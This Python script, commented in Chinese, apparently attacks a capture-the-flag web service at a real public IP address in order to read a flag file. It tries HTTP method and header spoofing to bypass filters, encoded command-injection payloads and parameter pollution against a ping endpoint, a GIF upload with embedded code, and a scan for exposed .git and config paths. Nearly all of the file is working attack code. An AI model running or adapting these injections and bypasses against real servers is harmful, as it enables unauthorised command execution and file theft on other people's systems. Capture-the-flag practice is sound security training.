import requests
import re
import os
import time
import urllib.parse

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("高级绕过测试 - Ping/Backup/Include")
print("="*70)

# 1. HTTP方法绕过
print("\n" + "="*70)
print("1. 不同HTTP方法测试")
print("="*70)

methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE"]

for method in methods:
    try:
        r = session.request(method, f"{TARGET}/ping", params={"host": "127.0.0.1"}, timeout=10)
        print(f"[{method}] /ping 状态码: {r.status_code}, 大小: {len(r.content)}")
    except Exception as e:
        print(f"[{method}] /ping 错误: {e}")

# 2. 请求头绕过
print("\n" + "="*70)
print("2. 特殊请求头测试")
print("="*70)

special_headers = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"Host": "127.0.0.1"},
    {"Referer": "http://127.0.0.1:8088/"},
    {"Origin": "http://127.0.0.1:8088"},
]

for headers in special_headers:
    try:
        r = session.get(f"{TARGET}/ping", params={"host": "127.0.0.1"}, headers=headers, timeout=10)
        body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
        if body:
            content = body.group(1).strip()
            if "Blocked" not in content and len(content) > 50:
                print(f"\n>>> 头: {headers}")
                print(f"响应: {content[:200]}")
                
                flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                    exit(0)
    except:
        pass

# 3. Content-Type绕过
print("\n" + "="*70)
print("3. 不同Content-Type测试")
print("="*70)

content_types = [
    "application/x-www-form-urlencoded",
    "application/json",
    "text/plain",
    "multipart/form-data",
    "application/xml",
]

for ct in content_types:
    try:
        headers = {"Content-Type": ct}
        if ct == "application/json":
            data = '{"host": "127.0.0.1"}'
        elif ct == "application/xml":
            data = '<?xml version="1.0"?><root><host>127.0.0.1</host></root>'
        else:
            data = "host=127.0.0.1"
        
        r = session.post(f"{TARGET}/ping", headers=headers, data=data, timeout=10)
        body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
        if body:
            content = body.group(1).strip()
            if "Blocked" not in content and len(content) > 50:
                print(f"\n>>> Content-Type: {ct}")
                print(f"响应: {content[:200]}")
                
                flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                    exit(0)
    except:
        pass

# 4. 参数污染
print("\n" + "="*70)
print("4. HTTP参数污染测试")
print("="*70)

pollution_payloads = [
    {"host": ["127.0.0.1", "whoami"]},
    {"host": ["127.0.0.1", "type F:\\flag.txt"]},
]

for payload in pollution_payloads:
    try:
        r = session.get(f"{TARGET}/ping", params=payload, timeout=10)
        body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
        if body:
            content = body.group(1).strip()
            print(f"\n>>> 参数污染: {payload}")
            print(f"响应: {content[:300]}")
            
            flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
    except:
        pass

# 5. URL编码和双重编码绕过
print("\n" + "="*70)
print("5. URL编码绕过测试")
print("="*70)

encoded_payloads = [
    ("127.0.0.1%20%26%20type%20F%3A%5Cflag.txt", "编码空格&"),
    ("127.0.0.1%2520%2526%2520type%2520F%253A%255Cflag.txt", "双重编码"),
    ("127.0.0.1%00&type%20F:\\flag.txt", "空字节+命令"),
    ("127.0.0.1%7c%7ctype%20F:\\flag.txt", "编码管道"),
    ("127.0.0.1%3btype%20F:\\flag.txt", "编码分号"),
    ("127.0.0.1%26%26type%20F:\\flag.txt", "编码&&"),
]

for payload, desc in encoded_payloads:
    try:
        r = session.get(f"{TARGET}/ping?host={payload}", timeout=10)
        body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
        if body:
            content = body.group(1).strip()
            if "Blocked" not in content and len(content) > 50:
                print(f"\n>>> {desc}: {payload}")
                print(f"响应: {content[:300]}")
                
                flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                    exit(0)
    except:
        pass

# 6. 路径参数的Ping
print("\n" + "="*70)
print("6. 路径参数测试")
print("="*70)

path_payloads = [
    "/ping/127.0.0.1",
    "/ping/127.0.0.1/whoami",
    "/ping/127.0.0.1&type%20F:\\flag.txt",
]

for path in path_payloads:
    try:
        r = session.get(f"{TARGET}{path}", timeout=10)
        body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
        if body:
            content = body.group(1).strip()
            if "Blocked" not in content and len(content) > 50:
                print(f"\n>>> 路径: {path}")
                print(f"响应: {content[:300]}")
                
                flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                    exit(0)
    except:
        pass

# 7. 测试上传功能（使用正常图片嵌入代码）
print("\n" + "="*70)
print("7. 上传功能绕过测试")
print("="*70)

# 创建一个包含Python代码的GIF文件
gif_header = b'GIF89a\x01\x00\x01\x00\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
python_code = b"import os; print(open('F:/flag.txt').read())"
malicious_gif = gif_header + python_code

files = {"file": ("test_python.gif", malicious_gif, "image/gif")}

r = session.post(f"{TARGET}/upload", files=files, timeout=15)
print(f"上传GIF结果: {r.status_code}")
print(f"响应: {r.text[:500]}")

# 8. 检查更多隐藏路径
print("\n" + "="*70)
print("8. 更多隐藏路径测试")
print("="*70)

hidden_paths = [
    "/.git/index",
    "/.git/logs/HEAD",
    "/.git/refs/heads/master",
    "/.gitignore",
    "/README",
    "/README.md",
    "/README.txt",
    "/CHANGELOG",
    "/CHANGELOG.md",
    "/LICENSE",
    "/LICENSE.txt",
    "/VERSION",
    "/version",
    "/status.json",
    "/health.json",
    "/config.json",
    "/settings.json",
    "/data.json",
    "/backup.json",
    "/export",
    "/export.json",
    "/dump",
    "/dump.json",
    "/download",
    "/download/flag.txt",
    "/get",
    "/get/flag",
    "/read",
    "/read/flag",
    "/view",
    "/view/flag",
    "/show",
    "/show/flag",
    "/open",
    "/open/flag",
]

for path in hidden_paths:
    try:
        r = session.get(f"{TARGET}{path}", timeout=10)
        if r.status_code == 200 and len(r.text) > 20:
            print(f"\n>>> {path}")
            print(f"状态码: {r.status_code}")
            print(f"内容: {r.text[:300]}")
            
            flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
    except:
        pass

print("\n测试完成")
